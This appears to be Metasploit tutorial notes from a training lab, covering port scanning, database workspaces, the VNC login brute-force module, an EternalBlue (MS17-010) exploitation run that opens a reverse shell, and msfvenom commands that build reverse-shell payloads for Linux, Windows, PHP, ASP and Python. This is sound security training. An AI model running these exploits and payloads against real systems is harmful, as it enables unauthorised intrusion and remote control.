# Port Scanning with Metasploit

Metasploit provides several modules for scanning open ports on target systems and networks. You can list available port scanning modules using the command:

```plaintext
msf6 > search portscan
```

### Matching Modules:

- `auxiliary/scanner/http/wordpress_pingback_access`: WordPress Pingback Locator
- `auxiliary/scanner/natpmp/natpmp_portscan`: NAT-PMP External Port Scanner
- `auxiliary/scanner/portscan/ack`: TCP ACK Firewall Scanner
- `auxiliary/scanner/portscan/ftpbounce`: FTP Bounce Port Scanner
- `auxiliary/scanner/portscan/syn`: TCP SYN Port Scanner
- `auxiliary/scanner/portscan/tcp`: TCP Port Scanner
- `auxiliary/scanner/portscan/xmas`: TCP "XMas" Port Scanner
- `auxiliary/scanner/sap/sap_router_portscanner`: SAPRouter Port Scanner

## Interacting with a Module

You can interact with a module by its name or index, for example:

```plaintext
msf6 > use auxiliary/scanner/portscan/tcp
```

## Portscan Options

To view the options for a selected portscan module, use:

```plaintext
msf6 auxiliary(scanner/portscan/tcp) > show options
```

### Module Options:

- **CONCURRENCY**: Number of targets to scan simultaneously (default: 10).
- **DELAY**: Delay between connections per thread (default: 0 ms).
- **JITTER**: Delay jitter factor (default: 0 ms).
- **PORTS**: Range of ports to scan (default: 1-10000).
- **RHOSTS**: Target hosts or networks.
- **THREADS**: Number of concurrent threads (default: 1).
- **TIMEOUT**: Socket connect timeout in milliseconds (default: 1000 ms).

## Nmap Integration

For quicker scans, you can directly run Nmap from the Metasploit console:

```plaintext
msf6 > nmap -sS 10.10.12.229
```

This will execute a SYN scan on the target IP.

## UDP Service Identification

The `scanner/discovery/udp_sweep` module can quickly identify services running over UDP. To use it:

```plaintext
msf6 auxiliary(scanner/discovery/udp_sweep) > run
```

## SMB Scans

Metasploit also includes auxiliary modules for scanning specific services like SMB:

```plaintext
msf6 auxiliary(scanner/smb/smb_version) > run
```

### Example Output:

Shows the operating system version and other details of the target system.

## Key Takeaways

- Port scanning modules in Metasploit can be used for various purposes, but for speed, Nmap is often a better option.
- Always check for modules specific to the services you are scanning (e.g., SMB, NetBIOS) as they may reveal valuable information about the target.

When engaging in penetration testing, you'll likely have multiple targets. To manage these efficiently, Metasploit utilizes a PostgreSQL database. Here’s how to set it up:

### Start PostgreSQL:

```bash
systemctl start postgresql
```

### Initialize the Database:

```bash
msfdb init
```

If it’s already started, you’ll see a message confirming that.

### Check Database Status:

Launch msfconsole and run:

```plaintext
db_status
```

You should see that you’re connected to the database.

### Workspaces:

Metasploit allows you to create workspaces to organize different projects. Use:

```plaintext
workspace -a <workspace_name>
```

For example:

```plaintext
workspace -a tryhackme
```

### Switching Workspaces:

You can easily switch between workspaces with:

```plaintext
workspace <workspace_name>
```

### Using Nmap with the Database:

Run a scan with:

```plaintext
db_nmap -sV -p- <target_ip>
```

This will save the results directly to your database.

### Accessing Hosts and Services:

After scanning, you can use the `hosts` and `services` commands to view the detected hosts and their services.

### Using Saved Hosts:

To use hosts from the database, run:

```plaintext
hosts -R
```

Then check your options with:

```plaintext
show options
```

### Scanning for Vulnerabilities:

Use vulnerability scanners like:

```plaintext
use auxiliary/scanner/smb/smb_ms17_010
```

Set the target with `RHOSTS`, check your options, and run the scan.

### Querying Specific Services:

Use the `services` command with the `-S` parameter to find specific services, like:

```plaintext
services -S netbios
```

### Look for Low-Hanging Fruits:

- **HTTP**: Possible web app vulnerabilities (e.g., SQL injection).
- **FTP**: May allow anonymous logins.
- **SMB**: Check for SMB exploits (e.g., MS17-010).
- **SSH**: Look for weak passwords.
- **RDP**: Be wary of vulnerabilities like Bluekeep.

Metasploit’s database features streamline your engagements, letting you compartmentalize, analyze, and import data efficiently!

## Overview of Using Metasploit for Vulnerability Scanning

Metasploit is a powerful tool that can help identify critical vulnerabilities in systems, often referred to as "low hanging fruit." This term describes easily identifiable and exploitable vulnerabilities that can provide access to systems, sometimes even granting high-level privileges like root or administrator access.

### Scanning and Fingerprinting

The effectiveness of finding vulnerabilities using Metasploit largely depends on your ability to scan and fingerprint the target system. The more accurately you can identify the services running on a target, the more options you have within Metasploit. For instance, if a VNC service is detected, you can leverage Metasploit's search function to find relevant modules.

### Example: VNC Scanning Modules

To scan for VNC services, you can use various auxiliary scanner modules. Here’s how to access the VNC scanner module:

```plaintext
msf6 > use auxiliary/scanner/vnc/
```

Common VNC scanning modules include:

- `auxiliary/scanner/vnc/ard_root_pw`
- `auxiliary/scanner/vnc/vnc_login`
- `auxiliary/scanner/vnc/vnc_none_auth`

### Module Information

To understand the details and functionalities of a specific module, such as the VNC login scanner, you can use the `info` command:

```plaintext
msf6 auxiliary(scanner/vnc/vnc_login) > info
```

### VNC Login Scanner Details

```plaintext
Name: VNC Authentication Scanner
Module: auxiliary/scanner/vnc/vnc_login
License: Metasploit Framework License (BSD)
Rank: Normal

Provided by:
    carstein 
    jduck 

Check supported:
    No

Basic options:
    Name              Current Setting                                                  Required  Description
    ----              ---------------                                                  --------  -----------
    BLANK_PASSWORDS   false                                                            no        Try blank passwords for all users
    BRUTEFORCE_SPEED  5                                                                yes       How fast to bruteforce, from 0 to 5
    DB_ALL_CREDS      false                                                            no        Try each user/password couple stored in the current database
    DB_ALL_PASS       false                                                            no        Add all passwords in the current database to the list
    DB_ALL_USERS      false                                                            no        Add all users in the current database to the list
    PASSWORD                                                                           no        The password to test
    PASS_FILE         /opt/metasploit-framework-5101/data/wordlists/vnc_passwords.txt  no        File containing passwords, one per line
    Proxies                                                                            no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS                                                                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
    RPORT             5900                                                             yes       The target port (TCP)
    STOP_ON_SUCCESS   false                                                            yes       Stop guessing when a credential works for a host
    THREADS           1                                                                yes       The number of concurrent threads (max one per host)
    USERNAME                                                                           no        A specific username to authenticate as
    USERPASS_FILE                                                                      no        File containing users and passwords separated by space, one pair per line
    USER_AS_PASS      false                                                            no        Try the username as the password for all users
    USER_FILE                                                                          no        File containing usernames, one per line
    VERBOSE           true                                                             yes       Whether to print output for all attempts
```

### Description:

```plaintext
This module will test a VNC server on a range of machines and report 
successful logins. Currently it supports RFB protocol version 3.3, 
3.7, 3.8, and 4.001 using the VNC challenge-response authentication 
method.
```

### References:

```plaintext
https://cvedetails.com/cve/CVE-1999-0506/
```

## Conclusion

The `vnc_login` module in Metasploit is designed to test VNC servers across multiple machines, attempting to report any successful login attempts. This capability allows penetration testers to quickly identify weak authentication mechanisms in VNC services, contributing to the overall vulnerability assessment of the target environment.

## Starting Metasploit and Exploit Overview

Metasploit is primarily an exploitation framework with a vast collection of modules, including:

- 2048 exploits
- 1105 auxiliary modules
- 344 post-exploitation modules
- 562 payloads
- 45 encoders
- 10 no-operation (NOP) modules
- 7 evasion techniques

## Searching and Using Exploits

You can utilize commands to interact with Metasploit:

- `search`: To find specific exploits.
- `info`: To get details about a chosen exploit.
- `exploit`: To launch the exploit.

While the process is straightforward, the effectiveness relies on your understanding of the services on the target system.

## Default Payloads and Available Options

Most exploits have default payloads, but you can view available payloads using the `show payloads` command:

```plaintext
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
```

The compatible payloads will be displayed, each with a description and rank.

## Selecting and Setting Payloads

Once you choose a payload, use the `set payload` command:

```plaintext
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 2
payload => generic/shell_reverse_tcp
```

You can view the options for the exploit and payload with the `show options` command.

### Example of Payload and Module Options:

**Exploit Options:**

- **RHOSTS**: Required target host(s).
- **RPORT**: Default is 445 for SMB.
- **SMBDomain, SMBUser, SMBPass**: Optional authentication parameters.

**Payload Options:**

- **LHOST**: The address to listen on (required).
- **LPORT**: The port for the listener (default is 4444).

## Setting LHOST and Running the Exploit

Set the LHOST value and execute the exploit:

```plaintext
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.186.44
lhost => 10.10.186.44
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

Successful execution will establish a connection:

```plaintext
[*] Command shell session 1 opened (10.10.186.44:4444 -> 10.10.12.229:49366)
C:\Windows\system32>
```

## Managing Background Sessions

You can background a session to work on multiple targets:

```plaintext
C:\Windows\system32>^Z
Background session 1? [y/N]  y
```

## Listing Active Sessions

Use the `sessions` command to manage and interact with active sessions:

```plaintext
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
```

## Active Session Management

To interact with a specific session:

```plaintext
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
[*] Starting interaction with 1...
C:\Windows\system32>
```

## Msfvenom Overview

Msfvenom is a versatile tool for generating payloads across various formats (PHP, exe, dll, elf, etc.) and platforms (Windows, Linux, Android, etc.).

### Listing Payloads

Use the command:

```bash
msfvenom -l payloads
```

This command displays all available payloads in the Metasploit framework (total of 562).

### Output Formats

Generate standalone payloads or raw formats. To list supported output formats:

```bash
msfvenom --list formats
```

### Encoders

Encoders do not bypass antivirus; they simply encode payloads. For example, encoding a PHP Meterpreter payload in Base64:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```

The output payload must be edited to include the starting PHP tag (`<?php`) and ending tag (`?>`).

### Setting Up the Listener

To catch incoming connections, use the Multi Handler:

Load the handler:

```bash
use exploit/multi/handler
```

Set the payload, local host, and port:

```bash
set payload php/reverse_php
set lhost 10.0.2.19
set lport 7777
```

Show options and run:

```bash
show options
run
```

### Generating Payloads for Different Systems

Examples for creating reverse payloads:

**Linux ELF:**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```

**Windows EXE:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

**PHP:**

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```

**ASP:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

**Python:**

```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

Note: Always ensure the handler is set up to match the payload parameters.